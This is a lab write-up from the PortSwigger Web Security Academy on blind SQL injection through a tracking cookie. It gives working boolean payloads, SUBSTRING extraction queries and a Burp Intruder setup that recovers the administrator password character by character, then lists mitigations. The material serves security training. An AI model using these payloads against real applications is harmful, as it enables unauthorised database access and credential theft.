# Blind SQL Injection with Conditional Responses

## Goal:
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Process

### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
```http
GET /filter?category=Pets HTTP/2
```

### 2. Modified Tracking ID to Test Boolean Conditions

**Injected Payload:**
```sql
' AND '1'='1
```

**The Tracking ID becomes:**
```http
Cookie: TrackingId=<ID>'+AND+'1'='1;
```
This returned a "Welcome back" message.

**Injected Payload:**
```sql
' AND '1'='2
```

**The Tracking ID becomes:**
```
Cookie: TrackingId=<ID>'+AND+'1'='2;
```
This did not return a "Welcome back" message. This confirms that the response can be controlled by injecting boolean conditions.

### 3. Verified the Existence of the `users` Table

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

This returned a "Welcome back" message, confirming that a table named `users` exists.

`LIMIT 1` ensures that the subquery returns exactly one row.

Without LIMIT, `' AND (SELECT 'a' FROM users)='a` the subquery may return multiple rows, which causes an error (will not return the "Welcome back" message). SQL doesn't allow a **scalar subquery** (one used in a comparison like = 'a') to return multiple rows.

### 4. Verified the `administrator` Username

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

This returned a "Welcome back" message, confirming there is a user named `administrator`.

### 5. Determined the Password Length and Sent to Intruder

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Tried increasing values to identify the password length until the query returned a "Welcome back" message:

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
```

This confirmed that the password length is 20.

### 6. Retrieved the Password Using Intruder (Sniper Attack)

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

Explanation:

- `SUBSTRING(string_expression, start_position, length)` is a SQL function used to extract part of a string.
- `password` is the string to extract from.
- Start at position `1` (SQL uses 1-based indexing).
- Extract `1` character.
So this returns the first character of the password field.

In Burp Intruder, select `a` and click the **Add §** button:

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
```

Payload tab configuration:
Payload type: simple list
Payload set: a-z and 0-9 (assuming no uppercase letters)

In the Grep-Match tab (from Settings), search for the value `Welcome back`.

Start the Sniper attack.

This returned a "Welcome back" message only for character `m`, indicating that `m` is the first character of the password.

![burpsuite response](./misc-images/09-1.png)

Repeated the process for the second character:
```sql
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§`
```

This returned a "Welcome back" message only for character `i`, indicating that `i` is the second character.

Repeated the process for all 20 characters and successfully retrieved the complete password.

Logged in as the administrator using the retrieved password.

---

## Mitigation

- Use parameterised queries (prepped statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.

Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#how-to-fix-this-vulnerability)

- Restrict database permissions: The application should connect using a low-privilege database account with access only to the necessary tables and operations. It should not have access to sensitive operations like `SELECT * FROM users`, `DROP`, `UPDATE`, `CREATE`, etc., unless absolutely required.

---

## Reflection

Learned how blind SQL injection can be used to extract data character-by-character using conditional responses and boolean logic.

---

## Notes

